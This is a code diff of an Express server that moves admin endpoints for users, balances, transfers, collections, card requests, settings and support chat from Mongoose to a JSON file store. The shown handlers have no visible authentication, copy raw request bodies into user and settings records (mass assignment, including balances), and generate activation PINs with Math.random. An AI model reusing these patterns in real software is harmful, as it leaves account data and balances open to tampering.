+      currentSC: "",
+      isTerminalVerified: req.body.isTerminalVerified !== undefined ? req.body.isTerminalVerified : false,
+      activationPin: req.body.activationPin || Math.floor(100000 + Math.random() * 900000).toString()
+    };
+
+    db.users.push(newUser);
+    writeDb(db);
+    return res.json(sanitizeUserForAdmin(newUser));
   });
 
-  app.patch("/api/admin/users/:id", async (req, res) => {
+  app.patch("/api/admin/users/:id", (req, res) => {
+    const db = readDb();
+    const user = db.users.find(u => u.id === req.params.id);
+    if (!user) {
+      return res.status(404).json({ message: "User not found" });
+    }
+
     const updates = { ...req.body };
     if (updates.balance !== undefined) {
       updates.balance = parseFloat(updates.balance);
-      if (isNaN(updates.balance)) {
-        updates.balance = 0;
-      }
+      if (isNaN(updates.balance)) updates.balance = 0;
     }
-    const user = await User.findOneAndUpdate(
-      { id: req.params.id },
-      updates,
-      { new: true }
-    );
-    
-    if (user) res.json(user.toJSON());
-    else res.status(404).json({ message: "User not found" });
+
+    Object.assign(user, updates);
+    writeDb(db);
+    return res.json(sanitizeUserForAdmin(user));
   });
 
-  // Sync current code inputs
-  app.post("/api/user/:id/sync-codes", async (req, res) => {
-    const { currentTC, currentVC, currentSC } = req.body;
-    const updatePayload: any = {};
-    if (currentTC !== undefined) updatePayload.currentTC = currentTC;
-    if (currentVC !== undefined) updatePayload.currentVC = currentVC;
-    if (currentSC !== undefined) updatePayload.currentSC = currentSC;
-    
-    const user = await User.findOneAndUpdate(
-      { id: req.params.id },
-      updatePayload,
-      { new: true }
-    );
-    if (user) {
-      res.json({ success: true });
-    } else {
-      res.status(404).json({ message: "User not found" });
+  app.delete("/api/admin/users/:id", (req, res) => {
+    const db = readDb();
+    const initialLen = db.users.length;
+    db.users = db.users.filter(u => u.id !== req.params.id);
+    if (db.users.length === initialLen) {
+      return res.status(404).json({ message: "User not found" });
     }
+    writeDb(db);
+    return res.json({ success: true });
   });
 
-  // Admin: Transfers
-  app.get("/api/admin/transfers", async (req, res) => {
-    const transfers = await Transfer.find();
-    const users = await User.find();
-    
-    const enriched = transfers.map(t => {
-      const tJson = t.toJSON();
-      const user = users.find(u => u.id === t.userId);
+  // Admin: Transfers management
+  app.get("/api/admin/transfers", (req, res) => {
+    const db = readDb();
+    const enriched = db.transfers.map(t => {
+      const user = db.users.find(u => u.id === t.userId);
       return {
-        ...tJson,
+        ...t,
         userName: user?.name || "Unknown"
       };
     });
-    res.json(enriched);
+    return res.json(enriched);
   });
 
-  // Admin: Collections
-  app.get("/api/admin/collections", async (req, res) => {
-    const collections = await Collection.find();
-    const users = await User.find();
-    
-    const enriched = collections.map(c => {
-      const cJson = c.toJSON();
-      const user = users.find(u => u.id === c.userId);
+  app.patch("/api/admin/transfers/:id", (req, res) => {
+    const db = readDb();
+    const transfer = db.transfers.find(t => t.id === req.params.id);
+    if (!transfer) {
+      return res.status(404).json({ message: "Transfer not found" });
+    }
+    if (req.body.status) {
+      transfer.status = req.body.status;
+    }
+    writeDb(db);
+    return res.json(transfer);
+  });
+
+  // Admin: Collections management
+  app.get("/api/admin/collections", (req, res) => {
+    const db = readDb();
+    const enriched = db.collections.map(c => {
+      const user = db.users.find(u => u.id === c.userId);
       return {
-        ...cJson,
+        ...c,
         userName: user?.name || "Unknown"
       };
     });
-    res.json(enriched);
+    return res.json(enriched);
   });
 
-  app.patch("/api/admin/collections/:id", async (req, res) => {
-    const collection = await Collection.findOneAndUpdate(
-      { id: req.params.id },
-      { status: req.body.status },
-      { new: true }
-    );
-    if (collection) {
-      res.json(collection.toJSON());
-    } else {
-      res.status(404).json({ message: "Collection not found" });
+  app.patch("/api/admin/collections/:id", (req, res) => {
+    const db = readDb();
+    const collection = db.collections.find(c => c.id === req.params.id);
+    if (!collection) {
+      return res.status(404).json({ message: "Collection not found" });
     }
+    if (req.body.status) {
+      collection.status = req.body.status;
+    }
+    writeDb(db);
+    return res.json(collection);
   });
 
-  // Admin: Settings
-  app.get("/api/admin/settings", async (req, res) => {
-    const settings = await getSettingsDoc();
-    res.json(settings.toJSON());
-  });
-
-  app.patch("/api/admin/settings", async (req, res) => {
-    const settings = await getSettingsDoc();
-    Object.assign(settings, req.body);
-    await settings.save();
-    res.json(settings.toJSON());
-  });
-
-  // Chat / Support
-  app.get("/api/chat/:userId", async (req, res) => {
-    const msgs = await ChatMessage.find({ userId: req.params.userId });
-    
-    // Mark as read by user
-    await ChatMessage.updateMany(
-      { userId: req.params.userId, sender: "agent", readUser: false },
-      { readUser: true }
-    );
-    
-    // Fetch updated to return correctly
-    const updatedMsgs = await ChatMessage.find({ userId: req.params.userId });
-    res.json(updatedMsgs.map(m => m.toJSON()));
-  });
-
-  app.post("/api/chat", async (req, res) => {
-    const { userId, sender, text } = req.body;
-    const newMsg = await ChatMessage.create({
-      id: "msg" + Date.now(),
-      userId,
-      sender,
-      text,
-      time: new Date().toISOString(),
-      readAdmin: sender === "agent",
-      readUser: sender === "user"
+  // Admin: Card Requests management
+  app.get("/api/admin/card-requests", (req, res) => {
+    const db = readDb();
+    const enriched = db.cardRequests.map(cr => {
+      const user = db.users.find(u => u.id === cr.userId);
+      return {
+        ...cr,
+        userName: user?.name || "Unknown"
+      };
     });
-    res.json(newMsg.toJSON());
+    return res.json(enriched);
   });
 
-  app.get("/api/admin/chat", async (req, res) => {
-    const msgs = await ChatMessage.find();
-    res.json(msgs.map(m => m.toJSON()));
+  app.patch("/api/admin/card-requests/:id", (req, res) => {
+    const db = readDb();
+    const request = db.cardRequests.find(cr => cr.id === req.params.id);
+    if (!request) {
+      return res.status(404).json({ message: "Card request not found" });
+    }
+    if (req.body.status) {
+      request.status = req.body.status;
+    }
+    writeDb(db);
+    return res.json(request);
   });
 
-  app.post("/api/admin/chat/mark-read", async (req, res) => {
+  // Admin: Settings management
+  app.get("/api/admin/settings", (req, res) => {
+    const db = readDb();
+    return res.json(db.settings);
+  });
+
+  app.patch("/api/admin/settings", (req, res) => {
+    const db = readDb();
+    Object.assign(db.settings, req.body);
+    writeDb(db);
+    return res.json(db.settings);
+  });
+
+  // Admin: Chat oversight & read receipts
+  app.get("/api/admin/chat", (req, res) => {
+    const db = readDb();
+    return res.json(db.chatMessages);
+  });
+
+  app.post("/api/admin/chat/mark-read", (req, res) => {
     const { userId } = req.body;
-    await ChatMessage.updateMany(
-      { userId, sender: "user", readAdmin: false },
-      { readAdmin: true }
-    );
-    res.json({ success: true });
+    const db = readDb();
+    let updated = false;
+    db.chatMessages.forEach(m => {
+      if (m.userId === userId && m.sender === "user" && !m.readAdmin) {
+        m.readAdmin = true;
+        updated = true;
+      }
+    });
+    if (updated) {
+      writeDb(db);
+    }
+    return res.json({ success: true });
   });
 
-  // --- VITE MIDDLEWARE ---
+  // --- VITE MIDDLEWARE & SPA SERVING ---
   if (process.env.NODE_ENV !== "production") {
     const vite = await createViteServer({
       server: { middlewareMode: true },
